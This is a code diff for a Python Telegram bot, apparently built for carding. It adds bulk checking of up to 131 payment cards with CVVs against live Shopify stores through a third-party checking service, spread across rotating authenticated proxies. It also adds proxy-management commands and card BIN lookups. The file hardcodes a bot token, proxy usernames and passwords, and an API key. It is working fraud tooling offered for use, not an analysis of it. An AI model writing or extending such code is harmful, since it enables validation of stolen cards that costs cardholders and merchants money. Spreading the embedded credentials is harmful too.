@@ -5,9 +5,38 @@ import telebot
 from typing import List
 import threading
 import random
+import xml.etree.ElementTree as ET
+import os
 
 # ===================== CONFIG =====================
 BOT_TOKEN = "8854554558:AAGKqtF4BimDmTLbXqy9_czvHEvr5iMNse8"
+MAX_MASS_CHECK = 131
+PROXY_FILE = "proxy_list.txt"
+
+# Default proxy list (used only if file doesn't exist)
+DEFAULT_PROXIES = [
+    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.58.2:3129",
+    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@65.111.2.42:3129",
+    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.60.148:3129",
+    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@209.50.170.138:3129",
+    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.49.59:3129",
+    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.40.228:3129",
+    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@65.111.0.40:3129",
+    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@65.111.5.31:3129",
+    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.38.238:3129",
+    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.33.161:3129",
+    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@209.50.166.226:3129",
+    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@216.26.225.61:3129",
+    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@216.26.249.212:3129",
+    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@65.111.0.216:3129",
+    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@65.111.15.217:3129",
+    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@45.3.62.100:3129",
+    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@216.26.252.209:3129",
+    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.40.131:3129",
+    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.59.223:3129",
+    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@209.50.185.169:3129",
+]
+
 shop_urls = [
     "https://52a07b-2.myshopify.com",
     "https://6sbibg-yh.myshopify.com",
@@ -31,30 +60,34 @@ shop_urls = [
     "https://burlap-kitchen.myshopify.com",
 ]
 
-# ===================== PROXY CONFIG =====================
-proxy_list = [
-    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.58.2:3129",
-    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@65.111.2.42:3129",
-    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.60.148:3129",
-    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@209.50.170.138:3129",
-    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.49.59:3129",
-    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.40.228:3129",
-    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@65.111.0.40:3129",
-    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@65.111.5.31:3129",
-    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.38.238:3129",
-    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.33.161:3129",
-    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@209.50.166.226:3129",
-    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@216.26.225.61:3129",
-    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@216.26.249.212:3129",
-    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@65.111.0.216:3129",
-    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@65.111.15.217:3129",
-    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@45.3.62.100:3129",
-    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@216.26.252.209:3129",
-    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.40.131:3129",
-    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.59.223:3129",
-    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@209.50.185.169:3129",
-]
+# ===================== PROXY MANAGEMENT =====================
+def load_proxies():
+    if os.path.exists(PROXY_FILE):
+        with open(PROXY_FILE, 'r') as f:
+            lines = [line.strip() for line in f if line.strip()]
+            if lines:
+                return lines
+    return DEFAULT_PROXIES.copy()
 
+def save_proxies(proxies):
+    with open(PROXY_FILE, 'w') as f:
+        for p in proxies:
+            f.write(p + '\n')
+
+def is_valid_proxy_format(proxy_str):
+    # user:pass@host:port
+    parts = proxy_str.split('@')
+    if len(parts) != 2:
+        return False
+    user_pass, host_port = parts
+    if ':' not in user_pass or ':' not in host_port:
+        return False
+    return True
+
+# Global proxy list (loaded on startup)
+proxy_list = load_proxies()
+
+# ===================== BOT SETUP =====================
 bot = telebot.TeleBot(BOT_TOKEN)
 user_check_in_progress = {}
 last_check_time = {}
@@ -79,6 +112,23 @@ def esc(t):
     return str(t).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
 
 def bin_lookup(bin_code):
+    try:
+        url = f"https://api.bincodes.com/bin/?format=xml&api_key=9fc53b3db09ca830488d19546a4fc2a1&bin={bin_code}"
+        r = requests.get(url, timeout=10)
+        if r.status_code == 200:
+            root = ET.fromstring(r.text)
+            bin_data = root.find('bin')
+            if bin_data is not None:
+                return {
+                    "brand": bin_data.find('brand').text if bin_data.find('brand') is not None else "N/A",
+                    "type": bin_data.find('type').text if bin_data.find('type') is not None else "N/A",
+                    "level": bin_data.find('level').text if bin_data.find('level') is not None else "N/A",
+                    "bank": bin_data.find('bank').text if bin_data.find('bank') is not None else "N/A",
+                    "country": bin_data.find('country').text if bin_data.find('country') is not None else "N/A",
+                    "country_emoji": bin_data.find('flag').text if bin_data.find('flag') is not None else "🏳️"
+                }
+    except Exception:
+        pass
     try:
         url = f"https://bins.antipublic.cc/bins/{bin_code}"
         r = requests.get(url, timeout=10)
@@ -187,7 +237,6 @@ def format_result(card, api_json, user, user_id, elapsed):
     return text
 
 def extract_cards_from_text(text: str) -> List[str]:
-    """Extract cards with robust regex patterns."""
     patterns = [
         r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
         r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
@@ -225,12 +274,23 @@ def extract_cards_from_text(text: str) -> List[str]:
 # ===================== BOT COMMAND HANDLERS =====================
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    bot.reply_to(message, "Welcome to the CC Checker Bot! Use /sh to check a card.")
+    bot.reply_to(message, 
+        "Welcome to the CC Checker Bot!\n\n"
+        "Commands:\n"
+        "/sh [card] - Check a single card (cc|mm|yy|cvv)\n"
+        "/msh - Upload a .txt file for mass check (max 131 cards)\n"
+        "/addproxy <proxy> - Add a proxy (user:pass@host:port)\n"
+        "/addproxyfile - Upload a .txt file with proxies (one per line)\n"
+        "/viewproxy [page] - List proxies (10 per page)\n"
+        "/delproxy <index> - Delete a proxy by index\n"
+        "/clearproxy - Delete ALL proxies\n"
+        "/proxycount - Show total number of proxies"
+    )
 
+# ===================== SINGLE CHECK =====================
 @bot.message_handler(func=lambda m: m.text and (m.text.startswith('/sh') or m.text.startswith('.sh')))
 def check_card(message):
     uid = str(message.from_user.id)
-    username = (message.from_user.username or "").lower()
 
     if user_check_in_progress.get(uid, False):
         bot.reply_to(message, "⏳ ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ: ʏᴏᴜʀ ʟᴀꜱᴛ ᴄʜᴇᴄᴋ ɪꜱ ꜱᴛɪʟʟ ᴘʀᴏᴄᴇꜱꜱɪɴɢ.")
@@ -288,6 +348,194 @@ def check_card(message):
             last_check_time[uid] = time.time()
     
     threading.Thread(target=process_check, daemon=True).start()
+
+# ===================== MASS CHECK =====================
+@bot.message_handler(commands=['msh'])
+def mass_check(message):
+    uid = str(message.from_user.id)
+
+    if user_check_in_progress.get(uid, False):
+        bot.reply_to(message, "⏳ ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ: ʏᴏᴜʀ ʟᴀꜱᴛ ᴄʜᴇᴄᴋ ɪꜱ ꜱᴛɪʟʟ ᴘʀᴏᴄᴇꜱꜱɪɴɢ.")
+        return
+
+    if not message.document:
+        bot.reply_to(message, "❌ ᴘʟᴇᴀꜱᴇ ᴀᴛᴛᴀᴄʜ ᴀ .ᴛxᴛ ғɪʟᴇ ᴄᴏɴᴛᴀɪɴɪɴɢ ᴄᴀʀᴅꜱ (ᴏɴᴇ ᴘᴇʀ ʟɪɴᴇ).")
+        return
+
+    file_name = message.document.file_name
+    if not file_name.endswith('.txt'):
+        bot.reply_to(message, "❌ ғɪʟᴇ ᴍᴜꜱᴛ ʙᴇ ᴀ .ᴛxᴛ ғɪʟᴇ.")
+        return
+
+    try:
+        file_info = bot.get_file(message.document.file_id)
+        file_content = bot.download_file(file_info.file_path)
+        lines = file_content.decode('utf-8').splitlines()
+    except Exception as e:
+        bot.reply_to(message, f"❌ ᴄᴏᴜʟᴅ ɴᴏᴛ ʀᴇᴀᴅ ғɪʟᴇ: {str(e)}")
+        return
+
+    cards = []
+    for line in lines:
+        line = line.strip()
+        if not line:
+            continue
+        extracted = extract_cards_from_text(line)
+        if extracted:
+            cards.extend(extracted)
+        else:
+            parts = line.split('|')
+            if len(parts) == 4:
+                card_str = f"{parts[0]}|{parts[1].zfill(2)}|{parts[2]}|{parts[3]}"
+                if is_valid_card(card_str):
+                    cards.append(card_str)
+
+    if not cards:
+        bot.reply_to(message, "❌ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ғᴏᴜɴᴅ ɪɴ ᴛʜᴇ ғɪʟᴇ.")
+        return
+
+    if len(cards) > MAX_MASS_CHECK:
+        bot.reply_to(message, f"⚠️ ᴍᴀxɪᴍᴜᴍ {MAX_MASS_CHECK} ᴄᴀʀᴅꜱ ᴀʀᴇ ᴀʟʟᴏᴡᴇᴅ. ʏᴏᴜʀ ғɪʟᴇ ᴄᴏɴᴛᴀɪɴꜱ {len(cards)} ᴄᴀʀᴅꜱ. ᴏɴʟʏ ᴛʜᴇ ғɪʀꜱᴛ {MAX_MASS_CHECK} ᴡɪʟʟ ʙᴇ ᴄʜᴇᴄᴋᴇᴅ.")
+        cards = cards[:MAX_MASS_CHECK]
+
+    user_check_in_progress[uid] = True
+    progress_msg = bot.reply_to(message, f"🔄 ᴘʀᴏᴄᴇꜱꜱɪɴɢ {len(cards)} ᴄᴀʀᴅꜱ... ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ.")
+
+    def mass_process():
+        try:
+            total = len(cards)
+            for idx, card in enumerate(cards, 1):
+                try:
+                    shop_url = random.choice(shop_urls)
+                    proxy = random.choice(proxy_list)
+                    api_url = f"https://nik.cards/shopify?site={shop_url}&cc={card}&proxy={proxy}"
+                    proxies = {"http": proxy, "https": proxy}
+                    t0 = time.time()
+                    response = requests.get(api_url, timeout=60, proxies=proxies)
+                    elapsed = time.time() - t0
+                    try:
+                        api_json = response.json()
+                    except Exception:
+                        api_json = {"Response": response.text}
+                    user_display = message.from_user.username or message.from_user.first_name
+                    result_text = format_result(card, api_json, user=user_display, user_id=message.from_user.id, elapsed=elapsed)
+                    result_text += f"\n\n[ {idx}/{total} ]"
+                    bot.send_message(message.chat.id, result_text, parse_mode='HTML')
+                    time.sleep(0.5)
+                except Exception as e:
+                    bot.send_message(message.chat.id, f"❌ ᴇʀʀᴏʀ ᴄʜᴇᴄᴋɪɴɢ {card}: {str(e)}")
+                    time.sleep(0.5)
+
+            bot.edit_message_text(f"✅ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ ᴄᴏᴍᴘʟᴇᴛᴇᴅ! {total} ᴄᴀʀᴅꜱ ᴘʀᴏᴄᴇꜱꜱᴇᴅ.", chat_id=progress_msg.chat.id, message_id=progress_msg.message_id)
+        except Exception as e:
+            bot.edit_message_text(f"❌ ᴇʀʀᴏʀ ᴅᴜʀɪɴɢ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ: {str(e)}", chat_id=progress_msg.chat.id, message_id=progress_msg.message_id)
+        finally:
+            user_check_in_progress[uid] = False
+            last_check_time[uid] = time.time()
+
+    threading.Thread(target=mass_process, daemon=True).start()
+
+# ===================== PROXY MANAGEMENT HANDLERS =====================
+@bot.message_handler(commands=['addproxy'])
+def add_proxy(message):
+    args = message.text.split(maxsplit=1)
+    if len(args) != 2:
+        bot.reply_to(message, "❌ ᴜꜱᴀɢᴇ: /ᴀᴅᴅᴘʀᴏxʏ <ᴜꜱᴇʀ:ᴘᴀꜱꜱ@ʜᴏꜱᴛ:ᴘᴏʀᴛ>")
+        return
+    proxy_str = args[1].strip()
+    if not is_valid_proxy_format(proxy_str):
+        bot.reply_to(message, "❌ ɪɴᴠᴀʟɪᴅ ᴘʀᴏxʏ ꜰᴏʀᴍᴀᴛ. ᴜꜱᴇ ᴜꜱᴇʀ:ᴘᴀꜱꜱ@ʜᴏꜱᴛ:ᴘᴏʀᴛ")
+        return
+    if proxy_str in proxy_list:
+        bot.reply_to(message, "⚠️ ᴘʀᴏxʏ ᴀʟʀᴇᴀᴅʏ ᴇxɪꜱᴛꜱ.")
+        return
+    proxy_list.append(proxy_str)
+    save_proxies(proxy_list)
+    bot.reply_to(message, f"✅ ᴘʀᴏxʏ ᴀᴅᴅᴇᴅ. ᴄᴜʀʀᴇɴᴛ ᴄᴏᴜɴᴛ: {len(proxy_list)}")
+
+@bot.message_handler(commands=['addproxyfile'])
+def add_proxy_file(message):
+    if not message.document:
+        bot.reply_to(message, "❌ ᴘʟᴇᴀꜱᴇ ᴀᴛᴛᴀᴄʜ ᴀ .ᴛxᴛ ғɪʟᴇ ᴡɪᴛʜ ᴘʀᴏxɪᴇꜱ (ᴏɴᴇ ᴘᴇʀ ʟɪɴᴇ).")
+        return
+    file_name = message.document.file_name
+    if not file_name.endswith('.txt'):
+        bot.reply_to(message, "❌ ғɪʟᴇ ᴍᴜꜱᴛ ʙᴇ ᴀ .ᴛxᴛ ғɪʟᴇ.")
+        return
+    try:
+        file_info = bot.get_file(message.document.file_id)
+        file_content = bot.download_file(file_info.file_path)
+        lines = file_content.decode('utf-8').splitlines()
+    except Exception as e:
+        bot.reply_to(message, f"❌ ᴄᴏᴜʟᴅ ɴᴏᴛ ʀᴇᴀᴅ ғɪʟᴇ: {str(e)}")
+        return
+
+    added = 0
+    invalid = 0
+    for line in lines:
+        line = line.strip()
+        if not line:
+            continue
+        if is_valid_proxy_format(line) and line not in proxy_list:
+            proxy_list.append(line)
+            added += 1
+        else:
+            invalid += 1
+
+    if added:
+        save_proxies(proxy_list)
+        bot.reply_to(message, f"✅ ᴀᴅᴅᴇᴅ {added} ᴘʀᴏxɪᴇꜱ. ꜱᴋɪᴘᴘᴇᴅ {invalid} ɪɴᴠᴀʟɪᴅ ᴏʀ ᴅᴜᴘʟɪᴄᴀᴛᴇ. ᴄᴜʀʀᴇɴᴛ ᴄᴏᴜɴᴛ: {len(proxy_list)}")
+    else:
+        bot.reply_to(message, f"❌ ɴᴏ ᴠᴀʟɪᴅ ᴘʀᴏxɪᴇꜱ ꜰᴏᴜɴᴅ ɪɴ ᴛʜᴇ ғɪʟᴇ.")
+
+@bot.message_handler(commands=['viewproxy'])
+def view_proxy(message):
+    if not proxy_list:
+        bot.reply_to(message, "ℹ️ ɴᴏ ᴘʀᴏxɪᴇꜱ ɪɴ ᴛʜᴇ ʟɪꜱᴛ.")
+        return
+    args = message.text.split()
+    page = 1
+    if len(args) > 1 and args[1].isdigit():
+        page = int(args[1])
+    per_page = 10
+    total = len(proxy_list)
+    total_pages = (total + per_page - 1) // per_page
+    if page < 1:
+        page = 1
+    if page > total_pages:
+        page = total_pages
+    start = (page - 1) * per_page
+    end = min(start + per_page, total)
+    text = f"📋 ᴘʀᴏxʏ ʟɪꜱᴛ (ᴘᴀɢᴇ {page}/{total_pages}):\n"
+    for i, proxy in enumerate(proxy_list[start:end], start=start+1):
+        text += f"{i}. `{proxy}`\n"
+    text += f"\nᴛᴏᴛᴀʟ: {total} ᴘʀᴏxɪᴇꜱ"
+    bot.reply_to(message, text, parse_mode='Markdown')
+
+@bot.message_handler(commands=['delproxy'])
+def del_proxy(message):
+    args = message.text.split()
+    if len(args) != 2 or not args[1].isdigit():
+        bot.reply_to(message, "❌ ᴜꜱᴀɢᴇ: /ᴅᴇʟᴘʀᴏxʏ <ɪɴᴅᴇx>")
+        return
+    idx = int(args[1])
+    if idx < 1 or idx > len(proxy_list):
+        bot.reply_to(message, f"❌ ɪɴᴅᴇx ᴏᴜᴛ ᴏꜰ ʀᴀɴɢᴇ (1-{len(proxy_list)})")
+        return
+    removed = proxy_list.pop(idx - 1)
+    save_proxies(proxy_list)
+    bot.reply_to(message, f"✅ ᴅᴇʟᴇᴛᴇᴅ ᴘʀᴏxʏ #{idx}: `{removed}`", parse_mode='Markdown')
+
+@bot.message_handler(commands=['clearproxy'])
+def clear_proxy(message):
+    # Confirm with a reply keyboard? For simplicity, just clear.
+    proxy_list.clear()
+    save_proxies(proxy_list)
+    bot.reply_to(message, "🗑️ ᴀʟʟ ᴘʀᴏxɪᴇꜱ ʜᴀᴠᴇ ʙᴇᴇɴ ᴄʟᴇᴀʀᴇᴅ.")
+
+@bot.message_handler(commands=['proxycount'])
+def proxy_count(message):
+    bot.reply_to(message, f"📊 ᴛᴏᴛᴀʟ ᴘʀᴏxɪᴇꜱ: {len(proxy_list)}")
 
 # ===================== BOT POLLING =====================
 if __name__ == "__main__":
